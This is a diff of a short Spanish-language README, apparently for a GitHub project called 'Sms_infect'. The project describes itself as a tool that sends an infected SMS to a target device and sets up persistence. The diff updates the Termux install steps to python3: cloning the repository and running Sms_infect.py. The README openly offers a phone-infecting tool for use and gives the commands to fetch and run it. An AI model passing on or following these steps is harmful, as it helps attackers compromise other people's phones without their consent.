@@ -3,10 +3,10 @@ Herramienta que envia un sms infectado al dispositivo. genera persistencia y eli
 
 Instalación solo en termux:
 
-apt install python
+apt install python3
 
 git clone https://github.com/Lac0lm3n4/Sms_infect.git
 
 cd Sms_infect
 
-python Sms_infect.py
+python3 Sms_infect.py
